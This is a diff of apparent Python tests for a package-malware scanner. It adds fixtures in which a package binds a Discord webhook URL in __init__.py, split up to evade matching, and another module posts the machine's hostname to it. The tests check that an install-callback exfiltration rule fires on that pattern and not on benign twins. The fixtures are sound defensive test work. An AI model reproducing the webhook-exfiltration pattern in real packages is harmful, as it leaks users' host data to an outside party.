@@ -265,13 +265,22 @@ class TestADestinationOnlyWrittenAtImport:
     opt-out flag read from the environment is a destination named, not a send. Posting the
     environment to the same address at import is a send."""
 
+    @classmethod
+    def rules(cls, tmp_path: Path, module: str) -> set[str]:
+        return cls.package_rules(
+            tmp_path,
+            {
+                "src/telem/__init__.py": "__version__ = '1.0'\nfrom . import telemetry\n",
+                "src/telem/telemetry.py": module,
+            },
+        )
+
     @staticmethod
-    def rules(tmp_path: Path, module: str) -> set[str]:
+    def package_rules(tmp_path: Path, sources: dict[str, str]) -> set[str]:
         members = {
             "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
             "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
-            "src/telem/__init__.py": "__version__ = '1.0'\nfrom . import telemetry\n",
-            "src/telem/telemetry.py": module,
+            **sources,
         }
         archive = tmp_path / "telem-1.0.tar.gz"
         with tarfile.open(archive, "w:gz") as tgz:
@@ -374,6 +383,91 @@ class TestADestinationOnlyWrittenAtImport:
             "urllib.request.urlopen('https://pypi.org/simple/')\n"
         )
         assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
+
+    #: The package's `__init__.py`: the drop point written down and never read there.
+    INIT = (
+        "__version__ = '1.0'\n"
+        "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
+    )
+
+    def test_a_drop_point_written_in_init_and_posted_by_a_module_importing_it(
+        self, tmp_path: Path
+    ) -> None:
+        # loveclose 0.0.1: the hook bound in `__init__.py`, read nowhere there, and posted from
+        # functions in the modules that take it with `from <package> import HOOK`.
+        report = (
+            "import json, socket, urllib.request\n"
+            "from telem import HOOK\n"
+            "def report():\n"
+            "    body = json.dumps({'host': socket.gethostname()}).encode()\n"
+            "    urllib.request.urlopen(HOOK, body)\n"
+        )
+        rules = self.package_rules(
+            tmp_path, {"src/telem/__init__.py": self.INIT, "src/telem/report.py": report}
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in rules
+
+    def test_a_drop_point_in_init_another_module_only_hands_to_a_client_is_not(
+        self, tmp_path: Path
+    ) -> None:
+        # The twin: the same `__init__.py`, the name imported and only given to a constructor,
+        # printed and logged, never to a request.
+        report = (
+            "import logging\n"
+            "from telemlib import TelemetryLogger\n"
+            "from telem import HOOK\n"
+            "event_logger = TelemetryLogger(url=HOOK)\n"
+            "print('events go to', HOOK)\n"
+            "logging.getLogger(__name__).info('hook %s', HOOK)\n"
+        )
+        rules = self.package_rules(
+            tmp_path, {"src/telem/__init__.py": self.INIT, "src/telem/report.py": report}
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in rules
+
+
+class TestNamesSentForAnotherFile:
+    """`SentNames`: the names a file binds that another file of the package imports and sends."""
+
+    @staticmethod
+    def maps(sources: dict[str, str]) -> dict[str, dict[str, str]]:
+        from types import SimpleNamespace
+
+        from cordon_scanner.analysis.python.flows.cross_file import CrossFileMaps
+
+        units = [
+            SimpleNamespace(path=p, content=SimpleNamespace(text=t, is_binary=False))
+            for p, t in sources.items()
+        ]
+        return CrossFileMaps.of(units)["python_sent_names"] or {}
+
+    def test_a_name_imported_and_sent_by_two_modules_is_counted_for_its_own_file(self) -> None:
+        sent = (
+            "import requests\nfrom pkg import URL\n"
+            "def go(data):\n    requests.post(URL, json=data)\n"
+        )
+        maps = self.maps({"pkg/__init__.py": "URL = 'x'\n", "pkg/a.py": sent, "pkg/b.py": sent})
+        assert maps == {"pkg/__init__.py": {"URL": "2"}}
+
+    def test_a_relative_import_and_an_alias_are_followed(self) -> None:
+        maps = self.maps(
+            {
+                "pkg/config.py": "URL = 'x'\n",
+                "pkg/a.py": "import urllib.request\nfrom .config import URL as u\n"
+                "urllib.request.urlopen(u)\n",
+            }
+        )
+        assert maps == {"pkg/config.py": {"URL": "1"}}
+
+    def test_a_name_only_constructed_printed_or_imported_is_not_sent(self) -> None:
+        maps = self.maps(
+            {
+                "pkg/__init__.py": "URL = 'x'\n",
+                "pkg/a.py": "import requests\nfrom pkg import URL\nclient = Client(URL)\n"
+                "print(URL)\nrequests.post('https://example.invalid/')\n",
+            }
+        )
+        assert maps == {}
 
 
 class TestAnImplantInstaller:
